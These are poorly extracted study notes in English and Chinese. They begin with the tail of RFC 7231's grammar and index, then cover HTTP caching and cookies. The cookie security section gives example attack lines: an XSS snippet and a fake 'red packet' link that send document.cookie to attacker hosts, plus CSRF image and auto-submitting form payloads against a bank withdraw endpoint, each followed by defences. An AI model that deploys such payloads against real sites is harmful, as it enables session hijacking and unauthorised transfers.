Accept = [ ( "," / ( media-range [ accept-params ] ) ) *( OWS "," [ OWS ( media-range [ accept-params ] ) ] ) ]
Accept-Charset = *( "," OWS ) ( ( charset / "*" ) [ weight ] ) *( OWS "," [ OWS ( ( charset / "*" ) [ weight ] ) ] )
Accept-Encoding = [ ( "," / ( codings [ weight ] ) ) *( OWS "," [ OWS ( codings [ weight ] ) ] ) ]
Accept-Language = *( "," OWS ) ( language-range [ weight ] ) *( OWS "," [ OWS ( language-range [ weight ] ) ] )
Allow = [ ( "," / method ) *( OWS "," [ OWS method ] ) ]
BWS = <BWS, see [RFC7230], Section 3.2.3>
Content-Encoding = *( "," OWS ) content-coding *( OWS "," [ OWS content-coding ] )
Content-Language = *( "," OWS ) language-tag *( OWS "," [ OWS language-tag ] )
Content-Location = absolute-URI / partial-URI Content-Type = media-type
Date = HTTP-date
Expect = "100-continue"
From = mailbox
GMT = %x47.4D.54 ; GMT
HTTP-date = IMF-fixdate / obs-date
IMF-fixdate = day-name "," SP date1 SP time-of-day SP GMT
     Location = URI-reference
Max-Forwards = 1*DIGIT
OWS = <OWS, see [RFC7230], Section 3.2.3>
RWS = <RWS, see [RFC7230], Section 3.2.3> Referer = absolute-URI / partial-URI Retry-After = HTTP-date / delay-seconds
Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content Server = product *( RWS ( product / comment ) )
[Page 94]
June 2014
     URI-reference = <URI-reference, see [RFC7230], Section 2.7> User-Agent = product *( RWS ( product / comment ) )
Vary = "*" / ( *( "," OWS ) field-name *( OWS "," [ OWS field-name ] ))
absolute-URI = <absolute-URI, see [RFC7230], Section 2.7> accept-ext = OWS ";" OWS token [ "=" ( token / quoted-string ) ] accept-params = weight *accept-ext
asctime-date = day-name SP date3 SP time-of-day SP year
charset = token
codings = content-coding / "identity" / "*"
comment = <comment, see [RFC7230], Section 3.2.6> content-coding = token
     date1 = day SP month SP year
date2 = day "-" month "-" 2DIGIT
date3 = month SP ( 2DIGIT / ( SP DIGIT ) ) day = 2DIGIT
day-name = %x4D.6F.6E ; Mon
/ %x54.75.65 ; Tue / %x57.65.64 ; Wed / %x54.68.75 ; Thu / %x46.72.69 ; Fri
/ %x53.61.74 ; Sat / %x53.75.6E ; Sun
day-name-l = %x4D.6F.6E.64.61.79 ; Monday / %x54.75.65.73.64.61.79 ; Tuesday
/ %x57.65.64.6E.65.73.64.61.79 ; Wednesday / %x54.68.75.72.73.64.61.79 ; Thursday
/ %x46.72.69.64.61.79 ; Friday
/ %x53.61.74.75.72.64.61.79 ; Saturday / %x53.75.6E.64.61.79 ; Sunday
delay-seconds = 1*DIGIT
field-name = <comment, see [RFC7230], Section 3.2>
hour = 2DIGIT
language-range = <language-range, see [RFC4647], Section 2.1> language-tag = <Language-Tag, see [RFC5646], Section 2.1>
mailbox = <mailbox, see [RFC5322], Section 3.4>
media-range = ( "*/*" / ( type "/*" ) / ( type "/" subtype ) ) *( OWS
";" OWS parameter )
Fielding & Reschke Standards Track [Page 95]
       RFC 7231 HTTP/1.1 Semantics and Content June 2014
media-type = type "/" subtype *( OWS ";" OWS parameter ) method = token
minute = 2DIGIT
month = %x4A.61.6E ; Jan
/ %x46.65.62 ; Feb / %x4D.61.72 ; Mar / %x41.70.72 ; Apr / %x4D.61.79 ; May / %x4A.75.6E ; Jun / %x4A.75.6C ; Jul / %x41.75.67 ; Aug / %x53.65.70 ; Sep / %x4F.63.74 ; Oct / %x4E.6F.76 ; Nov / %x44.65.63 ; Dec
obs-date = rfc850-date / asctime-date
parameter = token "=" ( token / quoted-string )
partial-URI = <partial-URI, see [RFC7230], Section 2.7> product = token [ "/" product-version ]
product-version = token
quoted-string = <quoted-string, see [RFC7230], Section 3.2.6> qvalue = ( "0" [ "." *3DIGIT ] ) / ( "1" [ "." *3"0" ] )
rfc850-date = day-name-l "," SP date2 SP time-of-day SP GMT
second = 2DIGIT subtype = token
       time-of-day = hour ":" minute ":" second
token = <token, see [RFC7230], Section 3.2.6> type = token
weight = OWS ";" OWS "q=" qvalue year = 4DIGIT
  Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content Index
1
1xx Informational (status code class) 50
2
2xx Successful (status code class) 51
[Page 96]
June 2014
 3
3xx Redirection (status code class) 54
4
4xx Client Error (status code class) 58
5
5xx Server Error (status code class) 62
1
100 Continue (status code) 50 100-continue (expect value) 34
101 Switching Protocols (status code) 50
2
200 OK (status code) 51
201 Created (status code) 52
202 Accepted (status code) 52
203 Non-Authoritative Information (status code) 52 204 No Content (status code) 53
205 Reset Content (status code) 53
3
300 Multiple Choices (status code) 55 301 Moved Permanently (status code) 56 302 Found (status code) 56
303 See Other (status code) 57
305 Use Proxy (status code) 58
306 (Unused) (status code) 58
307 Temporary Redirect (status code) 58
4
400 Bad Request (status code) 58
402 Payment Required (status code) 59 403 Forbidden (status code) 59 404 Not Found (status code) 59
405 Method Not Allowed (status code) 59 406 Not Acceptable (status code) 59
408 Request Timeout (status code) 60 409 Conflict (status code) 60
Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content
410 Gone (status code) 60
411 Length Required (status code) 61
413 Payload Too Large (status code) 61
414 URI Too Long (status code) 61
415 Unsupported Media Type (status code) 62 417 Expectation Failed (status code) 62
426 Upgrade Required (status code) 62
5
500 Internal Server Error (status code) 63
501 Not Implemented (status code) 63
502 Bad Gateway (status code) 63
503 Service Unavailable (status code) 63
504 Gateway Timeout (status code) 63
505 HTTP Version Not Supported (status code) 64
A
Accept header field 38 Accept-Charset header field 40 Accept-Encoding header field 41 Accept-Language header field 42
[Page 97]
June 2014
 Allow header field 72
C
cacheable 24
compress (content coding) 11
conditional request 36
CONNECT method 30
content coding 11
content negotiation 6
Content-Encoding header field 12 Content-Language header field 13 Content-Location header field 15 Content-Transfer-Encoding header field 89 Content-Type header field 10
D
Date header field 67 deflate (content coding) 11 DELETE method 29
E
Expect header field 34
F
From header field 44
Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content
[Page 98]
June 2014
 G
GET method 24 Grammar
Accept 38 Accept-Charset 40 Accept-Encoding 41 accept-ext 38 Accept-Language 42 accept-params 38 Allow 72 asctime-date 66 charset 9
codings 41 content-coding 11 Content-Encoding 12 Content-Language 13 Content-Location 15 Content-Type 10 Date 67
date1 65
day 65
day-name 65 day-name-l 65 delay-seconds 69 Expect 34
From 44
GMT 65
hour 65
HTTP-date 65 IMF-fixdate 65 language-range 42 language-tag 13 Location 68 Max-Forwards 36 media-range 38 media-type 8 method 21
minute 65
month 65 obs-date 66 parameter 8 product 46 product-version 46 qvalue 38
Referer 45 Retry-After 69 rfc850-date 66 second 65
Fielding & Reschke
Standards Track
[Page 99]
June 2014
 RFC 7231 HTTP/1.1 Semantics and Content
Server 73 subtype 8 time-of-day 65 type 8 User-Agent 46 Vary 70 weight 38
year 65
gzip (content coding) 11
H
HEAD method 25
 I
idempotent 23
L
Location header field 68
M
Max-Forwards header field 36 MIME-Version header field 89
O
OPTIONS method 31
P
payload 17 POST method 25 PUT method 26
R
Referer header field 45 representation 7 Retry-After header field 69
S
safe 22
selected representation 7, 71 Server header field 73
Status Codes Classes
1xx Informational 50 2xx Successful 51 3xx Redirection 54 4xx Client Error 58 5xx Server Error 62 Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content T
TRACE method 32
U
User-Agent header field 46
V
Vary header field 70
X
x-compress (content coding) 11 x-gzip (content coding) 11
Authors' Addresses
Roy T. Fielding (editor) Adobe Systems Incorporated 345 Park Ave
San Jose, CA 95110
USA
EMail: fielding@gbiv.com URI: http://roy.gbiv.com/
[Page 100]
June 2014
   Julian F. Reschke (editor) greenbytes GmbH Hafenweg 16
Muenster, NW 48155 Germany
EMail: julian.reschke@greenbytes.de URI: http://greenbytes.de/tech/webdav/
  Fielding & Reschke Standards Track [Page 101] Html markup produced by rfcmarkup 1.129d, available from https://tools.ietf.org/tools/rfcmarkup/
Different kinds of caches
The performance of web sites and applications can be 1,586

▪
significantly improved by reusing previously fetched resources. Web caches reduce latency and network traffic and thus
lessen the time needed to display a representation of a resource.
By making use of HTTP caching, Web sites become more responsive.
Different kinds of caches
Caching is a technique that stores a copy of a given resource and serves it back when requested.
When a web cache has a requested resource in its store, it
intercepts the request and returns its copy instead of redownloading from the originating server.
This achieves several goals: it eases the load of the server
that doesn’t need to serve all clients itself, and it improves performance by being closer to the client, i.e., it takes less time to transmit the resource back.
For a web site, it is a major component in achieving high performance.
On the other side, it has to be configured properly as not all resources stay identical forever: it is important to cache a
     ▪


## resource only until it changes, not longer.
There are several kinds of caches: these can be grouped into two
main categories: private or shared caches.
A shared cache is a cache that stores responses for reuse
by more than one user.
A private cache is dedicated to a single user.
browser and proxy caches, gateway caches, CDN, reverse
proxy caches and load balancers that are deployed on web servers for better reliability, performance and scaling of web sites and web applications.
Private browser caches
A private cache is dedicated to a single user.
     ▪


##  A browser cache holds all documents downloaded via HTTP by the user.
This cache is used to make visited documents available for
back/forward navigation, saving, viewing-as-source, etc. without requiring an additional trip to the server.
It likewise improves offline browsing of cached content.
Shared proxy caches
A shared cache is a cache that stores responses to be reused by more than one user.
For example, an ISP or your company might have set up a
web proxy as part of its local network infrastructure to serve many users so that popular resources are reused a number of times, reducing network traffic and latency.
Targets of caching operations
HTTP caching is optional, but reusing a cached resource is usually desirable.
However, common HTTP caches are typically limited to caching responses to GET and may decline other methods.
The primary cache key consists of the request method and
target URI (oftentimes only the URI is used as only GET requests are caching targets). Common forms of caching entries are:
       ▪


## - Successful results of a retrieval request: a 200 (OK) response to a GET request containing a resource like HTML documents, images or files.
- Permanent redirects: a 301 (Moved Permanently) response.
- Error responses: a 404 (Not Found) result page.
- Incomplete results: a 206 (Partial Content) response.
- Responses other than GET if something suitable for use as a cache key is defined.
A cache entry might also consist of multiple stored responses differentiated by a secondary key, if the request is target of content negotiation. For more details see the information about the Vary header below.
Controlling caching
The Cache-control header
The Cache-Control HTTP/1.1 general-header field is used to specify directives for caching mechanisms in both requests and responses.
Use this header to define caching policies with the variety of directives it provides.
No caching
  - The cache should not store anything about the client request or server response. A request is sent to the
       ▪


## server and a full response is downloaded each and every time.
  - Cache-Control: no-store
Cache but revalidate
  - A cache will send the request to the origin server for validation before releasing a cached copy.
  - Cache-Control: no-cache
Private and public caches
  - The "public" directive indicates that the response may be cached by any cache. This can be useful if pages with HTTP authentication, or response status codes that aren't normally cacheable, should now be cached.
  - On the other hand, "private" indicates that the response is intended for a single user only and must not be stored by a shared cache. A private browser cache may store the response in this case.
      - Cache-Control: private
  - Cache-Control: public
  Expiration ▪


##    - The most important directive here is "max- age=<seconds>" which is the maximum amount of time a resource will be considered fresh. Contrary to Expires, this directive is relative to the time of the request.
  - For the files in the application that will not change, you can usually add aggressive caching. This includes static files such as images, CSS files and JavaScript files
  - Cache-Control: max-age=31536000
Validation
  - When using the "must-revalidate" directive, the cache must verify the status of the stale resources before using it and expired ones should not be used.
  - Cache-Control: must-revalidate
The Pragma header
Pragma is a HTTP/1.0 header
not specified for HTTP responses and is therefore not a
reliable replacement for the general HTTP/1.1 Cache- header, although it does behave the same
as , if the Cache-Control header field is omitted in a request.
         Control
 Cache-Control: no-cache
 ▪


##   Use Pragma only for backwards compatibility with HTTP/1.0 clients.
Freshness
Once a resource is stored in a cache, it could theoretically be served by the cache forever.
Caches have finite storage so items are periodically removed from storage. This process is called cache
eviction.
As HTTP is a client-server protocol, servers can't contact
caches and clients when a resource changes; the cache should be updated.
  - they have to communicate an expiration time for the resource.
  - Before this expiration time, the resource is fresh;
  - after the expiration time, the resource is stale.
  - Eviction algorithms often privilege fresh resources over stale resources.
Note that a stale resource is not evicted or ignored;
  - when the cache receives a request for a stale resource, it forwards this request with a If-None-Match to check if it is in fact still fresh.
  - If so, the server returns a 304 (Not Modified) header, 1,593

without sending the body of the requested resource, saving some bandwidth.
 The freshness lifetime is calculated based on several headers. ▪


##  If a "Cache-control: max-age=N" header is specified   - the freshness lifetime = N.
If this header is not present, which is very often the case, it is checked if an Expires header is present.
⁃
if neither header is present, look for a Last-Modified header. ⁃
The expiration time is computed as follows: ⁃
  - ResponseTime: the time at which the response was received according to the browser.
Revved resources
The more we use cached resources, the better the responsiveness and the performance of a Web site will be.
To optimize this, good practices recommend to set expiration times as far in the future as possible. This is possible on resources that are regularly updated, or often, but is problematic for resources that are rarely and infrequently updated. They are the resources that would benefit the most from caching resources, yet this makes them very difficult to update. This is
   Expires header value - Date header value = freshness
lifetime.
  cache's freshness lifetime = Date header value - Last-
modified header value divided by 10.
  expirationTime = responseTime + freshnessLifetime -
currentAge
 ▪


## typical of the technical resources included and linked from each Web pages: JavaScript and CSS files change infrequently, but when they change you want them to be updated quickly.
Web developers invented a technique that Steve Souders called revving.
Infrequently updated files are named in a specific way: in
their URL, usually in the filename, a revision (or version) number is added. That way each new revision of this resource is considered as a resource on its own
that never changes and that can have an expiration time very far in the future, usually one year or even more.
In order to have the new versions, all the links to them must
be changed, that is the drawback of this method: additional complexity that is usually taken care of by the tool chain used by Web developers. When the infrequently variable resources change they induce an additional change to often variable resources. When these are read, the new versions of the others are also read.
This technique has an additional benefit: updating two cached resources at the same time will not lead to the situation where the out-dated version of one resource is used in combination with the new version of the other one. This is very important when web sites have CSS stylesheets or JS scripts that have mutual dependencies, i.e., they depend on each other because they refer to the same HTML elements.
  The revision version added to revved resources doesn't need to be a classical revision string like 1.1.3, or even a monotonously growing suite of number. It can be anything that prevent collisions, like a hash or a date. ▪


## Cache validation
When a cached document's expiration time has been reached, it is either validated or fetched again. Validation can only occur if the server provided either a strong validator or a weak validator.
Revalidation is triggered
when the user presses the reload button.
under normal browsing if the cached response includes the "Cache-control: must-revalidate" header.
the cache validation preferences in the Advanced-
>Cache preferences panel. option to force a validation each
time a document is loaded.
ETags
The ETag response header is an 不透明的 opaque-to-the- useragent value that can be used as a strong validator.
HTTP user-agent, such as the browser, does not know what
this string represents and can't predict what its value would be.
If the ETag header was part of the response for a resource, the client can issue an If-None-Match in the header of future
requests – in order to validate the cached resource. The Last-Modified response header can be used as a weak
validator. It is considered weak because it only has 1-second 1,598

▪
resolution.
If the Last-Modified header is present in a response, then
the client can issue an If-Modified-Since request header to validate the cached document.
When a validation request is made, the server can either ignore the validation request and response with a normal 200 OK, or it can return 304 Not Modified (with an empty body) to instruct the browser to use its cached copy. The latter response can also include headers that update the expiration time of the cached document.
Varying responses
The Vary HTTP response header determines how to match future request headers to decide whether a cached response can be used rather than requesting a fresh one from the origin server.
When a cache receives a request that can be satisfied by a cached response that has a header field, it must not use that cached response unless as nominated by the Vary header match in both the original (cached) request and the new request.
      Vary
 all header fields
 ▪


##  This can be useful for serving content dynamically, for example.
When using the Vary: User-Agent header, caching servers consider the user agent when deciding whether to serve the
   ▪


## page from cache.
  - If you are serving different content to mobile users, it can help you to avoid that a cache may mistakenly serve a desktop version of your site to your mobile users.
In addition, it can help Google and other search engines to discover the mobile version of a page, and might also tell
them that no Cloaking is intended.
Because the User-Agent header value is different ("varies")
for mobile and desktop clients, caches will not be used to serve mobile content mistakenly to desktop users or vice versa.
https://tools.ietf.org/pdf/rfc7234.pdf
https://www.mnot.net/cache_docs/
https://web.dev/http-cache/
https://redbot.org/
HTTP cookies
典型的场景比如购物⻋，当你点击下单按钮时，由于HTTP协议无 状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用
           ▪


## 户创建了特定的Session，用用于标识这个用户，并且跟踪用户，这 样才知道购物⻋里面有几本书。
这个Session是保存在服务端的，有一个唯一标识。 在服务端保存Session的方法很多，内存、数据库、文件都
有。
集群的时候也要考虑Session的转移，在大型的网站，一般会 有专⻔的Session服务器集群，用来保存用户会话，这个时候 Session 信息都是放在内存的，使用一些缓存服务比如 Memcached之类的来放 Session。
Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这 个数据可以保存在集群、数据库、文件中; Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信 息，也是实现Session的一种方式
An HTTP cookie (web cookie, browser cookie)
small piece of data that a server sends to the user's web
browser.
The browser may store it and send it back with the next
request to the same server.
  - Typically, it's used to tell if two requests came from the
same browser
  - for example.
  - keeping a user logged-in,
  - It remembers stateful information for
     ▪


## the stateless HTTP protocol. Cookies are mainly used for three purposes:
Session management
  - Logins, shopping carts, game scores, or anything else the server should remember
Personalization
  - User preferences, themes, and other settings
  - 某次登陆过一个网站，登陆信息可以写到Cookie里面， 访问网站的时候，网站⻚面的脚本可以读取这个信息， 就自动把用户名给填了，能够方便用户。
Tracking
  - Recording and analyzing user behavior
Cookies were once used for general client-side storage. While this was legitimate when they were the only way to store data on the client, it is recommended nowadays to prefer modern storage APIs. Cookies are sent with every request, so they can worsen performance (especially for mobile data connections).
Modern APIs for client storage are the Web storage API (localStorage and sessionStorage) and IndexedDB.
        To see stored cookies (and other storage that a web page can use), you can enable the Storage Inspector in Developer Tools
   and select Cookies from the storage tree.
 ▪


## Creating cookies
第一次创建Session的时候，服务端会在HTTP协议中告诉客户端， 需要在 Cookie 里面记录一个Session ID，以后每次请求把这个会 话ID发送到服务器，我就知道你是谁了。
When receiving an HTTP request, a server can send a Set- Cookie header with the response.
The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside
a Cookie HTTP header.
An expiration date or duration can be specified, after which the cookie is no longer sent.
Additionally, restrictions to a specific domain and path can be set, limiting where the cookie is sent.
    如果客户端的浏览器禁用了 Cookie 怎么办?一般这种情况下，会 使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交 互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务 ▪


## 端据此来识别用户。
name1=name1;name2=name2;name3=name3
The Set-Cookie and Cookie headers
The Set-Cookie HTTP response header sends cookies from the server to the user agent.
- Set-Cookie: <cookie-name>=<cookie-value>
This header from the server tells the client to store a cookie.
A simple cookie is set like this:
Set-
cookie:name=name;expires=date;path=path;domain=d
omain;secure
       HTTP/2.0 200 OK
Content-type: text/html
 Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
 [page content]
every new request to the server, the browser send all previously stored cookies to the server using the Cookie header.
  GET /sample_page.html HTTP/2.0
Host: www.example.org ▪


##  Cookie: yummy_cookie=choco;
tasty_cookie=strawberry
Session cookies
Set-Cookie: yummy_cookie=choco
The cookie created above is a session cookie, if didn't specify an Expires or Max-Age directive.
deleted when the client shuts down,
However, web browsers may use session restoring, which makes most session cookies permanent, as if the browser
was never closed.
Permanent cookies
Instead of expiring when the client closes, permanent cookies expire at a specific date (Expires) or after a specific length of time (Max-Age).
通常持久性的cookie会维护某一用户周期性访问服务器的配置文件或者 登录信息。
        Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015
07:28:00 GMT;
expires="Wdy,DD-Mon-YYYY HH:MM:SS"
   Note: When an expiry date is set, the time and date set is relative
to the client the cookie is being set on, not the server. ▪


## Secure cookies
A secure cookie is only sent to the server with an encrypted request over the HTTPS protocol.
Even with Secure, sensitive information should never be stored in cookies, as they are inherently insecure and this
flag can't offer real protection.
Starting with Chrome 52 and Firefox 52, insecure sites
(http:) can't set cookies with the Secure directive.
HttpOnly cookies
通过docuemnt.cookie可以设置和获取Cookie的值
To help mitigate cross-site scripting (XSS) attacks,
HttpOnly cookies are inaccessible to
JavaScript's Document.cookie API; they are only sent to the server.
For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the HttpOnly flag
       Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015
07:28:00 GMT; Secure;
  document.cookie = "user=wang";
console.log(document.cookie);
   should be set.
Scope of cookies
The Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to.
- Domain specifies allowed hosts to receive the cookie.   - 控制哪些站点可以看到那个cookie
  - unspecified, defaults: the host of the current document location, excluding subdomains.
  - specified, subdomains are always included.
  - For example
  - Domain=mozilla.org is set,
  - then cookies are included on subdomains
like developer.mozilla.org.
  - 如果用户访问的是mozilla.com那就会发送cookie:
name="wang",
  - 如果用户访问www.aaa.com(非
zhuanzhuan.58.com)就不会发送这个Cookie。
- Path indicates a URL path that must exist in the requested
URL in order to send the Cookie header.
  - 为服务器特定文档指定Cookie，这个属性设置的url且带有这
 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00
GMT; Secure;
 HttpOnly
         ▪


## 个前缀的url路径都是有效的。
  - The %x2F ("/") character is considered a directory
separator, and subdirectories will match as well.
  - For example, if Path=/docs is set, these paths will match:
  - /Docs
  - /docs/Web/
  - /docs/Web/HTTP
例如:
m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/
这两个url。 m.zhuanzhuan.58.com 设置cookie
m.zhaunzhuan.58.com/user/ 设置cookie: 访问其他路径m.zhuanzhuan.58.com/other/就会获得
cookie: id="123432"
如果访问m.zhuanzhuan.58.com/user/就会获得 cookie: id="123432" cookie: user="wang"
         - Set-cookie: id="123432";
domain="m.zhuanzhuan.58.com";
    - Set-cookie:user="wang",
domain="m.zhuanzhuan.58.com"; path=/user/
 ▪


## SameSite cookies
SameSite cookies
let servers require that a cookie shouldn't be sent with
cross-site (where Site is defined by the registrable domain) requests
  - provides some protection against cross-site request forgery attacks (CSRF).
- SameSite cookies are relatively new and supported by all major browsers.
example:
Set-Cookie: key=value; SameSite=Strict
The SameSite attribute can have one of three values (case-
insensitive):
None
  - The browser will send cookies with both cross-site requests and same-site requests.
Strict
  - The browser will only send cookies for same-site requests (requests originating from the site that set the cookie).
  - If the request originated from a different URL than the URL of the current location, none of the cookies
         ▪


## tagged with the Strict attribute will be included. Lax
  - Same-site cookies are withheld on cross-site subrequests, such as calls to load images or frames, but will be sent when a user navigates to the URL from an external site; for example, by following a link.
    Browsers are migrating to have cookies default
to
 SameSite=Lax.
 If a cookie is needed to be sent cross-origin, opt out of the
SameSite restriction using the
None
directive.
   The
directive requires the
Secure
attribute.
  None
Cookie prefixes
The design of the cookie mechanism
server is unable to confirm a cookie was set on a secure origin or indeed, tell where a cookie was originally set.
    subdomain such as
cookie that will be sent with requests to other sub-domains by setting the
can set a or
attribute:
application.example.com
example.com
  Domain
 Set-Cookie
 : CSRF=e8b667;
 Secure
;
If a vulnerable application is available on a sub-domain, this
 Domain
 =example.com ▪


## mechanism can be abused in a session fixation 定位 attack. When the user visits a page on the parent domain (or another subdomain), the application may trust the existing value sent in the user's cookie. This could allow an attacker to bypass CSRF protection or hijack a session after the user logs in.
Alternatively, if the parent domain does not
use HSTS with includeSubdomains set, a user subject to an active MITM (perhaps connected to an open WiFi network) could be served a response with a Set-Cookie header from a non- existent sub-domain. The end result would be much the same, with the browser storing the illegitimate cookie and sending it to all other pages under example.com.
Session fixation should primarily be mitigated by regenerating session cookie values when the user authenticates (even if a cookie already exists) and by tieing any CSRF token to the user. As a defence in depth measure, however, it is possible to
use cookie prefixes to assert specific facts about the cookie. Two prefixes are available:
__Host-
  - If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure, was sent from a secure origin, does not include
a Domain attribute, and has the Path attribute set to /. In this way, these cookies can be seen as "domain- locked".
__Secure-
  - If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure and was sent from a secure origin.
             ▪


##   - This is weaker than the __Host- prefix.
Cookies sent which are not compliant will be rejected by the
browser. Note that this ensures that if a sub-domain were to create a cookie with this name, it would be either be confined to the sub-domain or ignored completely.
As the application server will only check for a specific
cookie name when determining if the user is authenticated or a CSRF token is correct, this effectively acts as a defence measure against session fixation.
   On the application server, the web application must check for the full cookie name including the prefix—user agents will not strip the prefix from the cookie before sending it in a
request's
 Cookie
  header.
 For more information about cookie prefixes and the current state of browser support, see the Set-Cookie section.
JavaScript access using
Document.cookie
New cookies can also be created via JavaScript using
the Document.cookie property, and if the HttpOnly flag is not set, existing cookies can be accessed from JavaScript as well.
     document.cookie = "yummy_cookie=choco"; document.cookie = "tasty_cookie=strawberry";
 ▪


##  console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
Cookies created via JavaScript cannot include the HttpOnly flag. Please note the security issues in the Security section below.
Cookies available to JavaScript can be stolen through XSS.
Security
   Information stored in cookies
all cookie values will be visible to and can be changed by the end-user.
Depending on the application, it may be desirable to use an opaque identifier which is looked-up server-side or investigate alternative authentication/confidentiality mechanisms such as JSON Web Tokens.
 多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限 制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通 过窃取一套用户的cookies来冒充用户的请求。
从服务器的⻆度，它是没法分辨用户和攻击者的，因为用户和攻击者拥
有相同的身份验证。
几种cookie盗用和会话劫持的例子: ▪


## 网络窃听
网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式 WIFI。
这种流量包含在普通的未加密的HTTP清求上发送Cookie。 在未加密的情况下，攻击者可以读取网络上的其他用户的信息，
包含HTTP Cookie的全部内容，以便进行中间的攻击。 比如:拦截cookie来冒充用户身份执行恶意任务(银行转账
等)。 解决办法:服务器设置secure属性的cookie，这样就只能通过https的
方式来发送cookies了。 DNS缓存中毒
如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的 Cookie了，
例如: 攻击者使用DNS中毒来创建一个虚拟的DNS服务
h123456.www.demo.com指向攻击者服务器的ip地址。 然后攻击者可以从服务器 h123456.www.demo.com/img_01.png
发布图片。
用户访问这个图片，由于 www.demo.com和 h123456.www.demo.com是同一个子域，所以浏览器会把用户的 与www.demo.com相关的cookie都会发送到 h123456.www.demo.com这个服务器上，这样攻击者就会拿到用
         ▪


## 户的cookie搞事情。 一般情况下是不会发生这种情况，通常是网络供应商错误。
Session hijacking and XSS
Cookies are often used in web application to identify a user and their authenticated session
so stealing a cookie can lead to hijacking the authenticated user's session.
Common ways to steal cookies:
  - Social Engineering
  - exploiting an XSS vulnerability in the application.
当网站允许使用javascript操作cookie的时候，就会发生攻击者发 布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。
当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果 这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻 击者同样可以拿cookie搞事情。
解决办法: 通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代
     (new Image()).src = "http://www.evil-domain.example.com/steal- cookie?cookie=" + document.cookie;
 <a href="#" onclick=`window.location=http:// abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
 ▪


## 码将不能操作cookie。
  - The HttpOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.
Exfiltration avenues can be limited by deploying a strict Content-Security-Policy.
Cross-site request forgery (CSRF)
Example
someone includes an image that isn’t really an image (for example in an unfiltered chat or forum)
  - it really is a request to your bank’s server to withdraw money:
if you are logged into your bank account and your cookies are still valid (and there is no other validation)
you will transfer money as soon as you load the HTML that contains this image.
For endpoints that require a POST request
it's possible to programmatically trigger a <form> submit
(perhaps in an invisible <iframe>) when the page is loaded: <form action="https://bank.example.com/withdraw"
       <img src="https://bank.example.com/withdraw?
account=bob&amount=1000000&for=mallory">
       ▪


## method="POST">
<input type="hidden" name="account" value="bob">
<input type="hidden" name="amount" value="1000000">
<input type="hidden" name="for" value="mallory"> </form>
<script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
 例如，SanShao 正在浏览其他用户 XiaoMing 发布消息的聊天论坛。 假设 XiaoMing 制作了一个引用 ShanShao 银行网站的 HTML 图像
元素，如，
如果 SanShao 的银行将其认证信息保存在 cookie 中，并且
cookie 尚未过期，(当然是没有其他验证身份的东⻄)，那么 SanShao 的浏览器尝试加载该图片将使用他的 cookie 提交提款 表单，从而在未经 SanShao 批准的情况下授权交易。
to prevent this:
- 增加其他信息的校验(手机验证码，或者其他盾牌)。 - GET endpoints should be idempotent
◦ actions that enact a change and do not simply retrieve
data should require sending a POST (or other HTTP method) request.
  <img  src = "http://www.bank.com/withdraw?
user=SanShao&amount=999999&for=XiaoMing" >
 ◦ POST endpoints should not interchangeably accept GET requests with parameters in the query string.
- A CSRF token should be included in <form> elements via a hidden input field.
◦ This token should be unique per user and stored (for
example, in a cookie) such that the server can look up the expected value when the request is sent. For all non-GET requests that have the potential to perform an action, this input field should be compared against the expected value. If there is a mismatch, the request should be aborted.
◦ This method of protection relies on an attacker being unable to predict the user's assigned CSRF token. The
token should be regenerated on sign-in.
- Cookies that are used for sensitive actions (such as session cookies) should have a short lifetime with the SameSite attribute set to Strict or Lax.
◦ In supporting browsers, ensuring that the session
cookie is not sent along with cross-site requests and so the request is effectively unauthenticated to the application server.
- Both CSRF tokens and SameSite cookies should be deployed.
◦ This ensures all browsers are protected and provides protection where SameSite cookies cannot help (such
as attacks originating from a separate subdomain).
- For more prevention tips, see the OWASP CSRF prevention
       ▪


## cheat sheet.
Tracking and privacy
Third-party cookies
Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a first-party cookie. If the domain is different, it is said to be a third-party cookie.
While first-party cookies are sent only to the server setting
them, a web page may contain images or other components stored on servers in other domains (like ad banners).
Cookies that are sent through these third-party components are called third-party cookies and are mainly used for
advertising and tracking across the web.
  - See for example the types of cookies used by Google.
  - Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, Privacy Badger by the EFF).
If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered.
A clear disclosure (such as in a privacy policy) tends to
eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikimedia Foundation's cookie statement.
            Do-Not-Track
There are no legal or technological requirements for its use, but the DNT header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the DNT header for more information.
EU cookie directive
